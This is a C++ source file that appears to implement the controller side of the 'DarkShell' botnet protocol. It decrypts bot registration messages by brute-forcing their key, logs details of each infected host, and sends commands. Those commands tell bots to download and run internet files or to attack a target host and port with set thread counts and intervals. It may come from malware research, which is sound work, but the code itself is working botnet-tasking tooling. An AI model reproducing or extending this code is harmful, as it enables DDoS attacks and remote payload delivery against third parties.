/*****************************************************************
 * Created on 2012/01/31
****************************************************************/

#include <iostream>
#include <iomanip>
#include <ctime>

#include <pcap.h>
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <time.h>
#include <malloc.h>
#include <pthread.h>
#include <fcntl.h>
#include <syslog.h>
#include <arpa/inet.h>

#include <zlib.h>

#include "common.h"
#include "darkshell.h"
#include "darkshell_handler.h"

using namespace std;

int dshellhandler::on_read()
{
    int ret = bdatahandler::on_read();
    if (BERROR == ret)
    {
        return BERROR;
    }

    printf("dshellhandler::on_read(): peer=%s:%d, msg_len=%d, "
        "sizeof(dshell_register_msg)=%d\n", 
        inet_ntoa(m_addr.sin_addr), ntohs(m_addr.sin_port), ret, 
        sizeof(dshell_register_msg));

    char buf[512];
    bdatahandler::copy(buf, ret);
    if (ret < sizeof(dshell_register_msg))
    {
        hex_dump((u_char *)buf, ret);
        return BSUCCESS;
    }

    char buf2[512];    
    dshell_register_msg *msg = (dshell_register_msg *)buf2;
    u_char key = 155;  // sart
    while (true)
    {
        memcpy(buf2, buf, ret);
        dshell_decrypt((u_char *)buf2, ret, key);
        if (strstr(msg->memory, "MB") != NULL 
            && (strlen(msg->memory) < sizeof(msg->memory)))
        {
            break;
        }
        key++;
    }

    cout << "decrypted message:" << endl;
    cout << "register from " << inet_ntoa(m_addr.sin_addr) << ":" <<  \
        ntohs(m_addr.sin_port) << ", key=" << int(key)<< endl;
    cout << " processor: " << msg->processor << endl;
    cout << " mem: " << msg->memory<< endl;
    cout << " os: " << msg->os << endl;
    cout << " version: " << msg->version << endl;
    cout << " langid: " << msg->langid << endl;
    
    cout << "hexdump of decrypted message:" << endl;
    hex_dump((u_char * )msg, ret);

    // to file
    ofstream of("register.bin", ios::out | ios::app);
    if (!of)
    {
        cout << "failed to open log file " << endl;
        return BERROR;
    }
    of.write(buf2, ret);
    of.close();

    return BSUCCESS;
}

int dshellhandler::on_command(string &key, string &value)
{
    cout << "dshellhandler::on_command(),  " << key << ":"<< value << endl;    
    if (key == "-download")
    {
        m_cmd.cmdcode = DSHELL_CMD_FLAG_EXEC_INTERNET_FILE;
    }
    else if (key == "-code")
    {
        m_cmd.cmdcode += atoi(value.c_str());
    }
    else if (key == "-host")
    {
        strcpy(m_cmd.target_host, value.c_str());
    }
    else if (key == "-port")
    {
        m_cmd.target_port = atoi(value.c_str());
    }
    else if (key == "-thread")
    {
        m_cmd.thread_count = atoi(value.c_str());
    }
    else if (key == "-interval")
    {
        m_cmd.interval = atoi(value.c_str());
    }
    else if (key == "-low")
    {
        m_cmd.http_url_var_low = atoi(value.c_str());
    }
    else if (key == "-up")
    {
        m_cmd.http_url_var_up = atoi(value.c_str());
    }
    
    return BSUCCESS;
}

int dshellhandler::on_command(std::vector<std::string> &strs)
{
    dshell_command cmd;
    memset(&cmd, 0, sizeof(cmd));

    cout << "dshellhandler::on_command" << endl;
    
    str_vector_t::iterator iter;
    for (iter = strs.begin(); iter != strs.end(); )
    {
        std::string opt = *iter;
        iter++;
        if (iter == strs.end())
        {
            cout << "no value for " << opt << endl;
            return BERROR;
        }

        std::string value = *iter;
        
        if (opt == "-code")
        {
            cmd.cmdcode += atoi(value.c_str());
        }
        else if (opt == "-host")
        {
            strcpy(cmd.target_host, value.c_str());
        }
        else if (opt == "-port")
        {
            cmd.target_port = atoi(value.c_str());
        }
        else if (opt == "-thread")
        {
            cmd.thread_count = atoi(value.c_str());
        }
        else if (opt == "-interval")
        {
            cmd.interval = atoi(value.c_str());
        }
        else if (opt == "-low")
        {
            cmd.http_url_var_low = atoi(value.c_str());
        }
        else if (opt == "-up")
        {
            cmd.http_url_var_up = atoi(value.c_str());
        }

        iter++;
    }
    
    return send((char *)&cmd, sizeof(cmd));
}

int dshellhandler::send_command()
{
    return send((char *)&m_cmd, sizeof(m_cmd));
}

int dshellhandler::send(char data [ ], int len)
{
    dshell_command*send_msg = (dshell_command *)data;
    
    printf("dshellhandler::send(): code=0x%.8X, target=%s, port=%d, threads=%d\n", 
        send_msg->cmdcode,  send_msg->target_host, send_msg->target_port, 
        send_msg->thread_count);
    
    log_msg(false, data, len);
    
    return bdatahandler::send(data, len);
}

#if 0
int dshellhandler::log_msg(bool in, char data[], int len)
{
    int ret;
    if (in)
    {
        ret = save_message("./messages", CB1ST_MSG_PREFIX_INPUT, CB1ST_MSG_PREFIX_INPUT_LEN);
    }
    else
    {
        ret = save_message("./messages", CB1ST_MSG_PREFIX_OUTPUT, CB1ST_MSG_PREFIX_OUTPUT_LEN);
    }

    char buf[64];
    sprintf(buf, "%s:%d", inet_ntoa(m_addr.sin_addr), ntohs(m_addr.sin_port));
    ret += save_message("./messages", buf, strlen(buf));

    int padding = 0;
    char paded[] = "CCCCCCCCCCCCCCCCCCCCCCC";
    if ((strlen(buf) % 16) != 0)
    {
        int i;        
        padding = 16 - (strlen(buf) % 16);
        ret += save_message("./messages", paded, padding);
    }
    
    // in net order for easy reading
    len = htonl(len);
    ret += save_message("./messages", (char *)&len, sizeof(len));
    len = ntohl(len);
    
    ret += save_message("./messages", data, len);
    
    if (((len + 4) % 16) != 0)
    {
        int i;        
        padding = 16 - ((len + 4) % 16);
        ret += save_message("./messages", paded, padding);
    }

    return ret;
}
#endif

bdatahandler *dshellfactory::make(int fd)
{
    printf("dshellfactory::make: fd=%d\n", fd);
    dshellhandler *handler = new dshellhandler(fd);
    if (NULL == handler)
    {
        return NULL;
    }

    m_handlers_list.push_back(handler);
    handler->set_factory(this);
    return handler;
}

bdatahandler *dshellfactory::find(bid &id)
{
    std::list<dshellhandler *>::iterator iter;
    dshellhandler *p;
    for (iter = m_handlers_list.begin(); iter != m_handlers_list.end(); iter++)
    {
        p = *iter;
        if (0 == p->compare(id))
        {
            return p;
        }
    }

    return NULL;
}

void dshellfactory::showall()
{
    std::list<dshellhandler *>::iterator iter;
    dshellhandler *p;
    for (iter = m_handlers_list.begin(); iter != m_handlers_list.end(); iter++)
    {
        p = *iter;
        p->showid();
        cout << std::endl;
    }
}

